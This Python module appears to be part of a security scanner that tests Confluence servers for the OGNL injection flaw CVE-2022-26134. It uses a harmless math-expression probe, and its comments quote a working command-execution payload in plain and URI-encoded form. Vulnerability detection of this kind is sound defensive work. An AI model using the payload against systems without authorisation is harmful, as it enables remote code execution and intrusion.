import asyncio
from modules.core import console

# Atlassian Confluence Scanner (Wiki RCE)
# Focus: CVE-2022-26134 (OGNL Injection via URI).
# Payload: ${@java.lang.Runtime@getRuntime().exec("id")}

# Safer payload: Math calculation check or string echo to avoid noise/damage.
# ${1337*1337} -> 1787569

async def check_confluence(session, url):
    try:
        # Preamble check
        async with session.get(url, timeout=5, ssl=False) as r:
            if "Confluence" not in await r.text() and "X-Confluence" not in r.headers:
                # Might not be Confluence, but we try anyway if user targeted it.
                pass

        # CVE-2022-26134 Payload (URI Encoded)
        # /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/
        # Let's try to echo a header for safe verification if possible, or math.
        
        # Checking if X-Cmd-Response header is reflected is common in exploit scripts.
        # But standard response body reflection is easier.
        
        # Simple math payload in path
        payload = "/%24%7B1337*1337%7D/" 
        target = f"{url.rstrip('/')}{payload}"
        
        async with session.get(target, timeout=5, ssl=False, allow_redirects=False) as resp:
            # In vulnerable versions, the expression is evaluated and usually reflected or changes logic.
            # However, this specific CVE often reflects the result in a redirect header or body.
            
            # If redirected to /1787569/
            if "1787569" in resp.headers.get("Location", ""):
                 return {
                    "url": target,
                    "type": "Confluence OGNL Injection (CVE-2022-26134)",
                    "evidence": "Math expression 1337*1337 evaluated to 1787569 in Location header."
                }
            
            # Check Body
            text = await resp.text()
            if "1787569" in text:
                 return {
                    "url": target,
                    "type": "Confluence OGNL Injection (CVE-2022-26134)",
                    "evidence": "Math expression 1337*1337 evaluated in Body."
                }

    except Exception:
        pass
    return None

async def scan_confluence(session, url):
    """
    Scan for Atlassian Confluence Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- Confluence Scanner ---[/bold cyan]")
    
    results = []
    res = await check_confluence(session, url)
    if res:
         console.print(f"  [bold red][!] CONFLUENCE VULNERABLE: {res['url']}[/bold red]")
         console.print(f"      Status: {res['evidence']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No Confluence OGNL indicators found.[/dim]")
        
    return results
